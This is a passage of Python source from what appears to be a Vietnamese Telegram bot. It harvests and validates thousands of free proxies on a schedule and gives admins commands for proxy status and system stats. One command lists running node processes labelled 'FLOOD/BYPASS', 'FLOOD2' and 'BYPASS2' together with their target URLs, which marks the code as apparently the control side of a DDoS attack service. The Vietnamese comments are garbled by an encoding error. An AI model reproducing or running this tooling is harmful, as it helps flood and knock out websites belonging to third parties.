    """Kiá»ƒm tra proxy cÃ³ hoáº¡t Ä‘á»™ng khÃ´ng"""
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(
                "http://google.com",
                proxy=f"http://{proxy}",
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as response:
                return response.status == 200
    except:
        return False

async def update_proxy(restart=False):
    try:
        logger.info("Starting proxy update...")
        start_time = time.time()
        KEEP_BEST_PROXIES = 10000
        MAX_ATTEMPTS = 3
        MIN_NEW_PROXIES = 100  # Sá»‘ lÆ°á»£ng proxy má»›i tá»‘i thiá»ƒu cáº§n tÃ¬m
        
        proxy_path = './modules/proxy.txt'
        existing_proxies = set()  # Sá»­ dá»¥ng set Ä‘á»ƒ trÃ¡nh trÃ¹ng láº·p
        
        # Äá»c proxy hiá»‡n cÃ³ vÃ  giá»›i háº¡n sá»‘ lÆ°á»£ng náº¿u cáº§n
        if os.path.exists(proxy_path):
            try:
                with open(proxy_path, 'r') as f:
                    existing_proxies = {line.strip() for line in f if line.strip()}
                logger.info(f"Found {len(existing_proxies)} existing proxies")

                # Náº¿u sá»‘ proxy vÆ°á»£t quÃ¡ giá»›i háº¡n, chá»n ngáº«u nhiÃªn KEEP_BEST_PROXIES proxy
                if len(existing_proxies) > KEEP_BEST_PROXIES:
                    existing_proxies = set(random.sample(list(existing_proxies), KEEP_BEST_PROXIES))
                    logger.info(f"Randomly selected {KEEP_BEST_PROXIES} proxies to keep")
                    
                    # LÆ°u láº¡i danh sÃ¡ch proxy Ä‘Ã£ giá»›i háº¡n
                    with open(proxy_path, 'w') as f:
                        f.write('\n'.join(existing_proxies))
                    logger.info(f"Saved {len(existing_proxies)} proxies after limiting")
                
                # Backup file proxy
                backup_path = f"{proxy_path}.backup"
                with open(backup_path, 'w') as f:
                    f.write('\n'.join(existing_proxies))
            except Exception as e:
                logger.error(f"Error reading existing proxies: {e}")
                existing_proxies = set()

        # Danh sÃ¡ch cÃ¡c URL proxy
        proxy_urls = [
            'https://daudau.org/api/http.txt',
            'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
            'https://api.proxyscrape.com/?request=displayproxies&proxytype=https',
            'http://alexa.lr2b.com/proxylist.txt',
            'http://rootjazz.com/proxies/proxies.txt',
            'http://worm.rip/http.txt',
            'https://api.openproxylist.xyz/http.txt',
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous',
            'https://multiproxy.org/txt_all/proxy.txt',
            'https://openproxylist.xyz/http.txt',
            'https://proxyspace.pro/http.txt',
            'https://proxyspace.pro/https.txt',
            'https://proxy-spider.com/api/proxies.example.txt',
            'https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt',
            'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
            'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
            'https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt',
            'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt',
            'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt',
            'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt',
            'https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt',
            'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
            'https://raw.githubusercontent.com/jepluk/PROXYLIST/main/all.json',
            'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
            'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt',
            'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt',
            'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt',
            'https://raw.githubusercontent.com/MrMarble/proxy-list/main/all.txt',
            'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
            'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http_checked.txt',
            'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5_checked.txt',
            'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
            'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt',
            'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
            'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt',
            'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
            'https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/http.txt',
            'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
            'https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt',
            'https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt',
            'https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
            'https://raw.githubusercontent.com/Simatwa/free-proxies/master/files/http.json',
            'https://raw.githubusercontent.com/Simatwa/free-proxies/master/files/socks5.json',
            'https://raw.githubusercontent.com/sunny9577/proxy-list/master/proxy-list-raw.txt',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
            'https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks4.txt',
            'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt',
            'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt',
            'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt',
            'https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt',
            'https://spys.me/proxy.txt',
            'https://spys.me/socks.txt',
            'https://sunny9577.github.io/proxy-scraper/proxies.txt',
            'https://www.proxy-list.download/api/v1/get?type=http',
            'https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country=US',
            'https://www.proxy-list.download/api/v1/get?type=http&anon=transparent&country=US',
            'https://www.proxy-list.download/api/v1/get?type=https',
        ]

        working_proxies = set(existing_proxies)
        used_urls = set()  # Theo dÃµi cÃ¡c URL Ä‘Ã£ sá»­ dá»¥ng
        BATCH_SIZE = 100
        new_proxies_found = 0

        while len(used_urls) < len(proxy_urls) and new_proxies_found < MIN_NEW_PROXIES:
            # Chá»n URL chÆ°a sá»­ dá»¥ng
            available_urls = [url for url in proxy_urls if url not in used_urls]
            if not available_urls:
                break
                
            url = random.choice(available_urls)
            used_urls.add(url)
            logger.info(f"Attempting to fetch proxies from: {url}")
            
            try:
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: requests.get(url, timeout=10)
                )
                response.raise_for_status()
                content = response.text.strip()
                
                if not content:
                    logger.warning(f"Empty response from {url}, trying another URL...")
                    continue
                    
                new_proxies = set()
                for proxy in content.splitlines():
                    proxy = proxy.strip()
                    if proxy and ':' in proxy and proxy not in working_proxies:
                        try:
                            ip, port = proxy.split(':')
                            ipaddress.ip_address(ip)
                            port = int(port)
                            if 1 <= port <= 65535:
                                new_proxies.add(proxy)
                        except:
                            continue

                if not new_proxies:
                    logger.warning(f"No valid new proxies found from {url}, trying another URL...")
                    continue

                logger.info(f"Found {len(new_proxies)} new valid proxies, checking connectivity...")

                # Kiá»ƒm tra vÃ  lÆ°u proxy theo batch
                for i in range(0, len(new_proxies), BATCH_SIZE):
                    batch = list(new_proxies)[i:i + BATCH_SIZE]
                    tasks = []
                    for proxy in batch:
                        if proxy not in working_proxies:
                            tasks.append(check_proxy(proxy))
                    
                    if tasks:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        
                        working_batch = set()
                        for proxy, is_working in zip(batch, results):
                            if isinstance(is_working, bool) and is_working:
                                working_batch.add(proxy)
                                working_proxies.add(proxy)
                        
                        if working_batch:
                            async with aiofiles.open(proxy_path, 'a') as f:
                                await f.write('\n'.join(working_batch) + '\n')
                            logger.info(f"Added {len(working_batch)} working proxies to file")
                            new_proxies_found += len(working_batch)

                
            except Exception as e:
                logger.error(f"Error fetching proxies from {url}: {e}")
                continue

        # Xá»­ lÃ½ káº¿t quáº£ cuá»‘i cÃ¹ng
        total_duration = time.time() - start_time
        total_new_proxies = len(working_proxies) - len(existing_proxies)
        
        logger.info(
            f"Proxy update completed in {total_duration:.2f}s\n"
            f"URLs checked: {len(used_urls)}/{len(proxy_urls)}\n"
            f"Total proxies: {len(working_proxies)}\n"
            f"New proxies added: {total_new_proxies}"
        )
        
        return len(working_proxies), total_new_proxies

    except Exception as e:
        logger.error(f"Error in update_proxy: {e}")
        if os.path.exists(f"{proxy_path}.backup"):
            try:
                os.replace(f"{proxy_path}.backup", proxy_path)
                logger.info("Restored proxy file from backup due to error")
            except:
                pass
        return 0, 0

async def clean_proxy_file():
    """LÃ m sáº¡ch file proxy, loáº¡i bá» trÃ¹ng láº·p vÃ  Ä‘á»‹nh dáº¡ng khÃ´ng Ä‘Ãºng"""
    try:
        proxy_path = './modules/proxy.txt'
        if not os.path.exists(proxy_path):
            logger.warning("Proxy file not found")
            return 0

        # Äá»c tá»«ng dÃ²ng proxy
        with open(proxy_path, 'r') as f:
            content = f.read()

        # TÃ¡ch cÃ¡c proxy cÃ³ thá»ƒ bá»‹ dÃ­nh
        # TÃ¬m táº¥t cáº£ cÃ¡c Ä‘á»‹a chá»‰ IP:PORT báº±ng regex
        proxy_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5})'
        potential_proxies = re.findall(proxy_pattern, content)
        
        valid_proxies = set()
        invalid_lines = []

        for proxy in potential_proxies:
            try:
                ip, port = proxy.split(':')
                # Validate IP
                ipaddress.ip_address(ip)
                # Validate port
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.add(proxy)
                else:
                    invalid_lines.append(proxy)
            except:
                invalid_lines.append(proxy)

        # Táº¡o backup
        backup_path = f"{proxy_path}.backup"
        with open(backup_path, 'w') as f:
            f.write(content)

        # Ghi láº¡i file vá»›i cÃ¡c proxy há»£p lá»‡
        valid_proxies = sorted(valid_proxies)
        with open(proxy_path, 'w') as f:
            f.write('\n'.join(valid_proxies))

        # Log káº¿t quáº£
        logger.info(f"""Proxy cleaning results:
        - Original content length: {len(content)}
        - Valid unique proxies: {len(valid_proxies)}
        - Invalid entries removed: {len(invalid_lines)}
        - Invalid entries:
          {chr(10).join('  ' + l for l in invalid_lines[:10])}
          {f'... and {len(invalid_lines) - 10} more' if len(invalid_lines) > 10 else ''}
        """)

        return len(valid_proxies)

    except Exception as e:
        logger.error(f"Error cleaning proxy file: {e}")
        if os.path.exists(backup_path):
            os.replace(backup_path, proxy_path)
        return 0

async def check_and_update_proxy(context: ContextTypes.DEFAULT_TYPE):
    """HÃ m callback cho job queue Ä‘á»ƒ cáº­p nháº­t proxy"""
    global is_proxy_update_running
    
    if is_proxy_update_running:
        logger.warning("Proxy update already in progress, skipping...")
        return
        
    try:
        is_proxy_update_running = True
        logger.info("Running scheduled proxy update...")
        
        proxy_path = './modules/proxy.txt'
        BATCH_SIZE = 100  # Xá»­ lÃ½ theo batch Ä‘á»ƒ trÃ¡nh quÃ¡ táº£i
        KEEP_BEST_PROXIES = 10000
        
        # Äá»c vÃ  validate proxy hiá»‡n cÃ³
        try:
            with open(proxy_path, 'r') as f:
                content = f.read().strip()
        except FileNotFoundError:
            content = ""
            logger.warning("Proxy file not found, creating new one")
            
        # TÃ¬m vÃ  validate proxy
        proxy_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5})'
        potential_proxies = re.findall(proxy_pattern, content)
        valid_proxies = set()
        
        # Xá»­ lÃ½ theo batch
        for i in range(0, len(potential_proxies), BATCH_SIZE):
            batch = potential_proxies[i:i + BATCH_SIZE]
            for proxy in batch:
                try:
                    ip, port = proxy.split(':')
                    ipaddress.ip_address(ip)
                    port = int(port)
                    if 1 <= port <= 65535:
                        valid_proxies.add(proxy)
                except:
                    continue
                    
            # Log tiáº¿n Ä‘á»™
            logger.info(f"Processed {i + len(batch)}/{len(potential_proxies)} proxies")
                
        # Giá»›i háº¡n sá»‘ lÆ°á»£ng proxy náº¿u cáº§n
        if len(valid_proxies) > KEEP_BEST_PROXIES:
            valid_proxies = set(random.sample(list(valid_proxies), KEEP_BEST_PROXIES))
            
        # Ghi láº¡i file vá»›i cÃ¡c proxy há»£p lá»‡
        async with aiofiles.open(proxy_path, 'w', newline='') as f:
            await f.write('\n'.join(sorted(valid_proxies)))
            await f.write('\n')
            
        logger.info(f"Saved {len(valid_proxies)} valid proxies")
        
        # ThÃªm proxy má»›i
        async def save_proxy_to_file(proxy):
            try:
                async with aiofiles.open(proxy_path, 'a', newline='') as f:
                    await f.write(f"{proxy}\n")
                return True
            except Exception as e:
                logger.error(f"Error saving proxy to file: {e}")
                return False
                
        # Tiáº¿p tá»¥c vá»›i pháº§n update proxy
        working, removed = await update_proxy()
        
        return working, removed
        
    except Exception as e:
        logger.error(f"Error in check_and_update_proxy: {e}")
        return 0, 0
    finally:
        is_proxy_update_running = False
# Cron job Ä‘á»ƒ tá»± Ä‘á»™ng cáº­p nháº­t proxy
async def proxy_cron():
    while True:
        try:
            logger.info("Starting proxy cron job...")
            working, removed = await update_proxy()
            logger.info(f"Cron job completed: {working} working proxies, {removed} removed")
            await asyncio.sleep(1800)  # Chá» 30 phÃºt giá»¯a cÃ¡c láº§n cáº­p nháº­t
        except Exception as e:
            logger.error(f"Error in proxy cron job: {e}")
            await asyncio.sleep(300)  # Náº¿u lá»—i, chá» 5 phÃºt rá»“i thá»­ láº¡i

async def monitor_proxy_updates(context: CallbackContext):
    """GiÃ¡m sÃ¡t vÃ  Ä‘áº£m báº£o proxy updates Ä‘ang hoáº¡t Ä‘á»™ng"""
    try:
        proxy_path = './modules/proxy.txt'
        
        if not os.path.exists(proxy_path):
            logger.warning("Proxy file not found, triggering update...")
            await check_and_update_proxy(context)
            return
            
        # Kiá»ƒm tra thá»i gian sá»­a Ä‘á»•i cá»§a file proxy
        file_modified = os.path.getmtime(proxy_path)
        current_time = time.time()
        
        # Náº¿u file khÃ´ng Ä‘Æ°á»£c cáº­p nháº­t trong 2 giá»
        if current_time - file_modified > 7200:  # 2 giá»
            logger.warning("Proxy file hasn't been updated for 2 hours, triggering update...")
            await check_and_update_proxy(context)
            
        # Kiá»ƒm tra sá»‘ lÆ°á»£ng proxy
        try:
            with open(proxy_path, 'r') as f:
                proxy_count = sum(1 for line in f if line.strip())
            
            if proxy_count < 100:  # NgÆ°á»¡ng tá»‘i thiá»ƒu
                logger.warning(f"Low proxy count ({proxy_count}), triggering update...")
                await check_and_update_proxy(context)
        except Exception as e:
            logger.error(f"Error checking proxy count: {e}")
            
    except Exception as e:
        logger.error(f"Error in proxy monitor: {e}")

async def start_proxy_cron(application: Application):
    """Khá»Ÿi Ä‘á»™ng vÃ  thiáº¿t láº­p cron job proxy"""
    try:
        logger.info("Initializing proxy cron system...")
        proxy_path = './modules/proxy.txt'
        KEEP_BEST_PROXIES = 10000

        # Clean proxy ngay khi khá»Ÿi Ä‘á»™ng
        logger.info("Cleaning proxy file on startup...")
        await clean_proxy_file()

        # Kiá»ƒm tra vÃ  giá»›i háº¡n proxy khi khá»Ÿi Ä‘á»™ng
        if os.path.exists(proxy_path):
            try:
                with open(proxy_path, 'r') as f:
                    proxies = [line.strip() for line in f if line.strip()]
                
                if len(proxies) > KEEP_BEST_PROXIES:
                    logger.info(f"Initial proxy count: {len(proxies)}, limiting to {KEEP_BEST_PROXIES}")
                    selected_proxies = random.sample(proxies, KEEP_BEST_PROXIES)
                    
                    # Backup file gá»‘c
                    backup_path = f"{proxy_path}.backup"
                    with open(backup_path, 'w') as f:
                        f.write('\n'.join(proxies))
                    
                    # Ghi file má»›i vá»›i proxies Ä‘Ã£ giá»›i háº¡n
                    with open(proxy_path, 'w') as f:
                        f.write('\n'.join(selected_proxies))
                    logger.info(f"Successfully limited initial proxies to {KEEP_BEST_PROXIES}")

                    # Clean láº¡i má»™t láº§n ná»¯a sau khi giá»›i háº¡n
                    await clean_proxy_file()
            except Exception as e:
                logger.error(f"Error limiting initial proxies: {e}")

        # Thiáº¿t láº­p job Ä‘á»‹nh ká»³
        job = application.job_queue.run_repeating(
            callback=check_and_update_proxy,
            interval=1800,  # 30 phÃºt
            first=1,
            name='proxy_update'
        )
        
        if job:
            logger.info("Proxy cron job successfully scheduled")
        else:
            logger.error("Failed to schedule proxy cron job")
            
    except Exception as e:
        logger.error(f"Error setting up proxy cron: {e}")
# ThÃªm hÃ m Ä‘á»ƒ kiá»ƒm tra tráº¡ng thÃ¡i proxy cron
@restrict_room
async def check_proxy_cron_status(update: Update, context: CallbackContext):
    """Kiá»ƒm tra tráº¡ng thÃ¡i cá»§a proxy cron job"""
    user_id = update.message.from_user.id
    
    if user_id not in admins:
        return
        
    try:
        proxy_path = './modules/proxy.txt'
        
        # Kiá»ƒm tra file tá»“n táº¡i
        if not os.path.exists(proxy_path):
            await update.message.reply_text('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âŒ KHÃ”NG CÃ“ FILE PROXY
â•‘ â€¢ File proxy.txt khÃ´ng tá»“n táº¡i
â•‘ â€¢ Sá»­ dá»¥ng /addpx Ä‘á»ƒ thÃªm proxy
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
            return
            
        # Äá»c vÃ  Ä‘áº¿m sá»‘ proxy
        with open(proxy_path, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
            
        total_proxies = len(proxies)
        
        # Kiá»ƒm tra proxy cÃ³ há»£p lá»‡ khÃ´ng
        valid_proxies = []
        invalid_proxies = []
        
        for proxy in proxies:
            try:
                ip, port = proxy.split(':')
                # Validate IP
                ipaddress.ip_address(ip)
                # Validate port
                port = int(port)
                if 1 <= port <= 65535:
                    valid_proxies.append(proxy)
                else:
                    invalid_proxies.append(proxy)
            except:
                invalid_proxies.append(proxy)
        
        # Kiá»ƒm tra tráº¡ng thÃ¡i cron job
        jobs = context.job_queue.jobs()
        proxy_jobs = [job for job in jobs if job.name == 'proxy_update']
        
        if proxy_jobs:
            # Chuyá»ƒn Ä‘á»•i thá»i gian sang mÃºi giá» Viá»‡t Nam
            next_run_utc = proxy_jobs[0].next_t
            next_run_vn = next_run_utc.astimezone(vietnam_tz)
            next_run = next_run_vn.strftime('%H:%M:%S %d/%m/%Y')
            
            # Láº¥y thá»i gian hiá»‡n táº¡i theo mÃºi giá» VN
            current_time = get_vietnam_time()
            time_until = next_run_vn - current_time
            minutes_until = int(time_until.total_seconds() / 60)
            
            message = f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âœ… PROXY CRON STATUS
â•‘ â€¢ Tráº¡ng thÃ¡i: Äang cháº¡y
â•‘ â€¢ Láº§n cáº­p nháº­t tiáº¿p theo: {next_run}
â•‘ â€¢ CÃ²n: {minutes_until} phÃºt
â•‘ ğŸ“Š THÃ”NG TIN PROXY:
â•‘ â€¢ Tá»•ng sá»‘ proxy: {total_proxies}
â•‘ â€¢ Proxy há»£p lá»‡: {len(valid_proxies)}
â•‘ â€¢ Proxy khÃ´ng há»£p lá»‡: {len(invalid_proxies)}'''

            if invalid_proxies:
                message += f'''
â•‘ â€¢ Proxy lá»—i ({min(5, len(invalid_proxies))}):
â•‘ {chr(10).join(f"â€¢ {proxy}" for proxy in invalid_proxies[:5])}'''
                if len(invalid_proxies) > 5:
                    message += f'''
â•‘ â€¢ VÃ  {len(invalid_proxies) - 5} proxy lá»—i khÃ¡c...'''
                    
            message += '''
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•'''

            await update.message.reply_text(message)
        else:
            await update.message.reply_text(f'''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•‘ âŒ PROXY CRON STATUS
â•‘ â€¢ Tráº¡ng thÃ¡i: KhÃ´ng hoáº¡t Ä‘á»™ng
â•‘ â€¢ Vui lÃ²ng khá»Ÿi Ä‘á»™ng láº¡i bot
â•‘ ğŸ“Š THÃ”NG TIN PROXY:
â•‘ â€¢ Tá»•ng sá»‘ proxy: {total_proxies}
â•‘ â€¢ Proxy há»£p lá»‡: {len(valid_proxies)}
â•‘ â€¢ Proxy khÃ´ng há»£p lá»‡: {len(invalid_proxies)}
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•''')
            
    except Exception as e:
        logger.error(f"Error checking proxy cron status: {e}")
        await update.message.reply_text(f"Error checking cron status: {str(e)}")
# Task Manager Command
async def send_monitoring_info(context: ContextTypes.DEFAULT_TYPE):
    try:
        # CPU & Memory info
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        memory_used = round(memory.used/1024/1024/1024, 2)
        memory_total = round(memory.total/1024/1024/1024, 2)
        memory_percent = memory.percent

        monitoring_info = f"""
â•­â”â”â”â”â”ã€Œ System Monitor ã€â”â”â”â”â”
â”£â”âŠ³ ğŸ”² CPU: {cpu_percent}%
â”£â”âŠ³ ğŸ’¾ RAM: {memory_percent}%
â”£â”âŠ³ ğŸ“Š RAM Used: {memory_used}/{memory_total}GB
â•°â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"""

        await context.bot.send_message(
            chat_id=MONITOR_CHAT_ID,
            text=monitoring_info
        )
    except Exception as e:
        logger.error(f"Error in monitoring task: {e}")


@restrict_room
async def task(update: Update, context: CallbackContext):
    global monitoring_task
    try:
        user_id = update.message.from_user.id
        if user_id not in admins:
            return

        # Kiá»ƒm tra xem cÃ³ argument "start" hoáº·c "stop" khÃ´ng
        if context.args:
            if context.args[0].lower() == "on":
                # Kiá»ƒm tra xem monitoring_task Ä‘Ã£ tá»“n táº¡i vÃ  Ä‘ang cháº¡y chÆ°a
                if monitoring_task and not monitoring_task.removed:
                    await update.message.reply_text("Monitoring Ä‘Ã£ Ä‘Æ°á»£c báº­t!")
                    return
                monitoring_task = context.job_queue.run_repeating(
                    send_monitoring_info,
                    interval=15, #15 giÃ¢y gá»­i cÃ¡i
                    first=1,
                    name='system_monitoring'
                )
                await update.message.reply_text("ÄÃ£ báº­t monitoring!")
                return
            elif context.args[0].lower() == "off":
                if monitoring_task and not monitoring_task.removed:
                    monitoring_task.schedule_removal()
                    monitoring_task = None
                    await update.message.reply_text("ÄÃ£ táº¯t monitoring!")
                    return
                await update.message.reply_text("Monitoring chÆ°a Ä‘Æ°á»£c báº­t!")
                return

        # CPU & Memory info
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        memory_used = round(memory.used/1024/1024/1024, 2)
        memory_total = round(memory.total/1024/1024/1024, 2)
        memory_percent = memory.percent

        # Process count
        process_count = len(psutil.pids())

        # Network info
        net_io = psutil.net_io_counters()
        bytes_sent = round(net_io.bytes_sent/1024/1024, 2)
        bytes_recv = round(net_io.bytes_recv/1024/1024, 2)

        # Disk info
        total_disk_space = 0
        used_disk_space = 0
        try:
            partitions = psutil.disk_partitions()
            for partition in partitions:
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                    total_disk_space += partition_usage.total
                    used_disk_space += partition_usage.used
                except Exception:
                    continue
            
            total_disk_space_gb = round(total_disk_space/1024/1024/1024, 2)
            used_disk_space_gb = round(used_disk_space/1024/1024/1024, 2)
            disk_percent = round((used_disk_space / total_disk_space) * 100, 2)
        except Exception as e:
            logger.error(f"Error getting disk info: {e}")
            total_disk_space_gb = used_disk_space_gb = disk_percent = 0

        # Uptime
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        days = uptime.days
        hours, remainder = divmod(uptime.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime_str = f"{days} ngÃ y, {hours} giá», {minutes} phÃºt"

        system_info = f"""
â•­â”â”â”â”â”ã€Œ ThÃ´ng Tin Há»‡ Thá»‘ng ã€â”â”â”â”â”
â”£â”âŠ³ ğŸ”² CPU: {cpu_percent}%
â”£â”âŠ³ ğŸ’¾ RAM: {memory_percent}%
â”£â”âŠ³ ğŸ“Š RAM Ä‘Ã£ dÃ¹ng: {memory_used}/{memory_total}GB
â”£â”âŠ³ ğŸ’¿ Tá»•ng bá»™ nhá»›: {total_disk_space_gb}GB
â”£â”âŠ³ ğŸ“€ ÄÃ£ sá»­ dá»¥ng: {used_disk_space_gb}GB ({disk_percent}%)
â”£â”âŠ³ ğŸŒ Network:
â”£â”âŠ³ â¬†ï¸ ÄÃ£ gá»­i: {bytes_sent}MB
â”£â”âŠ³ â¬‡ï¸ ÄÃ£ nháº­n: {bytes_recv}MB
â”£â”âŠ³ â° Uptime: {uptime_str}
â”—â”âŠ³ ğŸ“± Sá»‘ tiáº¿n trÃ¬nh: {process_count}
â•°â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"""

        # ThÃªm thÃ´ng tin vá» tráº¡ng thÃ¡i monitoring
        if monitoring_task and not monitoring_task.removed:
            system_info += "\nğŸ“Š Monitoring: Äang cháº¡y"
        else:
            system_info += "\nğŸ“Š Monitoring: ÄÃ£ táº¯t"

        await update.message.reply_text(system_info)

    except Exception as e:
        logger.error(f"Error in task command: {e}")
        await update.message.reply_text(f"âŒ Lá»—i khi láº¥y thÃ´ng tin há»‡ thá»‘ng: {str(e)}")

@restrict_room
async def list_processes(update: Update, context: CallbackContext):
    try:
        user_id = update.message.from_user.id
        if user_id not in admins:
            return

        # TÃ¬m táº¥t cáº£ cÃ¡c tiáº¿n trÃ¬nh node.js Ä‘ang cháº¡y
        node_processes = []
        # ThÃªm cÃ¡c file má»›i vÃ o danh sÃ¡ch target
        target_files = [
            'two-methods.js',
            'non-protection.js',
            'try-protection.js'
        ]
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'create_time', 'memory_info']):
            try:
                # Kiá»ƒm tra náº¿u process info lÃ  None
                if not proc.info:
                    continue
                    
                # Kiá»ƒm tra tÃªn process
                if proc.info.get('name') != 'node':
                    continue
                    
                # Láº¥y vÃ  kiá»ƒm tra cmdline
                cmdline = proc.info.get('cmdline')
                if not cmdline:  # Skip if cmdline is None or empty
                    continue
                    
                # Kiá»ƒm tra xem cÃ³ pháº£i process target khÃ´ng
                is_target_process = any(file in ' '.join(cmdline) for file in target_files)
                
                if is_target_process:
                    process = psutil.Process(proc.info['pid'])
                    create_time = datetime.fromtimestamp(process.create_time())
                    running_time = datetime.now() - create_time
                    memory_info = process.memory_info()
                    memory_mb = round(memory_info.rss / 1024 / 1024, 2) if memory_info else 0
                    
                    target_url = "N/A"
                    process_type = "N/A"
                    
                    # TÃ¬m URL vÃ  loáº¡i process
                    for i, cmd in enumerate(cmdline):
                        if any(file in cmd for file in target_files):
                            # XÃ¡c Ä‘á»‹nh loáº¡i process dá»±a trÃªn tÃªn file
                            if "two-methods.js" in cmd:
                                process_type = "FLOOD/BYPASS"
                                if i + 1 < len(cmdline):
                                    target_url = cmdline[i + 1]
                            elif "non-protection.js" in cmd:
                                process_type = "FLOOD2"
                                if i + 1 < len(cmdline):
                                    target_url = cmdline[i + 1]
                            elif "try-protection.js" in cmd:
                                process_type = "BYPASS2"
                                # Vá»›i try-protection.js, URL náº±m á»Ÿ vá»‹ trÃ­ cuá»‘i cÃ¹ng
                                target_url = cmdline[-1]
                            break
                    
                    node_processes.append({
                        'pid': proc.info['pid'],
                        'target': target_url,
                        'type': process_type,
                        'memory': memory_mb,
                        'running_time': running_time
                    })
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, Exception) as e:
                logger.error(f"Error processing process: {e}")
                continue

        if not node_processes:
            await update.message.reply_text('''<blockquote expandable>
KhÃ´ng cÃ³ tiáº¿n trÃ¬nh nÃ o Ä‘ang cháº¡y</blockquote>''', parse_mode='HTML')
            return

        # Chia danh sÃ¡ch tiáº¿n trÃ¬nh thÃ nh cÃ¡c pháº§n nhá» hÆ¡n
        MAX_PROCESSES_PER_MESSAGE = 5
        chunks = [node_processes[i:i + MAX_PROCESSES_PER_MESSAGE] 
                 for i in range(0, len(node_processes), MAX_PROCESSES_PER_MESSAGE)]
        
        # Gá»­i tá»«ng pháº§n nhÆ° má»™t tin nháº¯n riÃªng biá»‡t
        for index, chunk in enumerate(chunks):
            process_list = []
